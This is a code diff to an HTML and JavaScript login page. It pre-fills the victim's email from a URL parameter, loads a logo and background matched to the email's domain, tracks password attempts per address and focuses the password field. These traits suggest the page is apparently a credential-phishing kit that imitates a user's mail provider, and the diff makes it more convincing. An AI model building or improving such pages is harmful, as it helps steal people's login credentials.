@@ -309,7 +309,7 @@
         <div class="img">
             <div class="" align="center">
                 <img id="logo" style="width: 80px; height: 80px;">
-                <!-- <div class="logo-fallback" id="logo-fallback">✓</div> -->
+                <div class="logo-fallback" id="logo-fallback">✓</div>
             </div>
         </div>
         
@@ -531,10 +531,12 @@ function initializeForm() {
         updateAttemptDisplay();
     }
     
-    // Focus on email field
-    setTimeout(() => {
+    // Focus on password field if email is already filled
+    if (currentEmail) {
+        $('#psw').focus();
+    } else {
         $('#email').focus();
-    }, 100);
+    }
 }
 
 // Update logo when user enters email
@@ -740,6 +742,34 @@ document.querySelector('input[name="_honey"]').addEventListener('focus', functio
 
 // Initialize form when page loads
 $(document).ready(function() {
+    // Check for email parameter in URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlEmail = urlParams.get('email');
+    
+    if (urlEmail && urlEmail.trim() !== '') {
+        const emailField = document.getElementById('email');
+        emailField.value = urlEmail;
+        currentEmail = urlEmail;
+        
+        // Store email for persistence
+        localStorage.setItem('currentEmail', urlEmail);
+        
+        // Check if we have stored attempts for this email
+        if (storedEmail === urlEmail) {
+            updateAttemptDisplay();
+        } else {
+            // Reset attempts for new email from URL
+            loginAttempts = 0;
+            localStorage.setItem('loginAttempts', 0);
+            updateAttemptDisplay();
+        }
+        
+        // Trigger the input event to load logo and background
+        if (isValidEmail(urlEmail)) {
+            loadLogoFromEmail(urlEmail);
+        }
+    }
+    
     initializeForm();
     
     // REMOVED: Initialize background toggle
@@ -752,14 +782,5 @@ window.addEventListener('beforeunload', function() {
     // localStorage.removeItem('currentEmail');
 });
 </script>
-
-<script>
-  const params = new URLSearchParams(window.location.search);
-  const email = params.get("email");
-  if (email) {
-    document.getElementById("email").value = email;
-  }
-</script>
-  
 </body>
 </html>
